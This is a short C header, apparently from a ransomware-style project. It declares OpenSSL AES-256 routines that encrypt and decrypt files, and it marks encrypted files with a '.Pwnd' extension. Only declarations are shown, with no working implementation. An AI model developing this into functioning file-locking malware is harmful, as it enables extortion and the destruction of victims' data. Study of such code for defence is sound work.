#ifndef RLIB
#define RLIB

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <openssl/rand.h>

#define BUFSIZE 1024
#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16

static const char ENCRYPT_EXT[] = ".Pwnd";
static const int EXT_LEN = strlen(".Pwnd");

enum {
    ENCRYPT,
    DECRYPT,
    IV_SIZE = 16,
    KEY_SIZE = 32,
};

void handleErrors(void);
int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size);
int hexa_to_bytes(const char hex_string[], unsigned char val[], int size);
int encrypt(const unsigned char *key, const unsigned char *iv, const char* plaintext_file);
int decrypt(const unsigned char *key, const unsigned char *iv, const char* cipher_file);

#endif
